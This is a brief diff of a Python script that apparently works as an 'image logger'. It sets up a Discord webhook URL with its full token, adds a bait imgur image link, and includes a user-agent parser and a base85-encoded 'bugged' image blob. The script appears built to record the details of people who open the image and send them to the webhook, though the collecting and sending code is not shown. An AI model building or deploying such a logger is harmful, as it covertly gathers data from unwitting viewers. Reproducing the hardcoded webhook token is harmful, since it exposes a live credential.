@@ -3,7 +3,7 @@ from urllib import parse
 import httpx, base64, httpagentparser, re, json
 
 webhook = 'https://discord.com/api/webhooks/1537744108444057651/NPsV1s5rDgFQ6asOGDzmcQAEGC_JZyM9ENqSfuQHZkg5KqAkedlFeRQ_XjrwZDMJ6HJ9'
-
+image = 'https://imgur.com/a/Thz4Jjw'
 bindata = httpx.get('https://pbs.twimg.com/profile_images/1284155869060571136/UpanAYid_400x400.jpg').content
 buggedimg = False
 buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
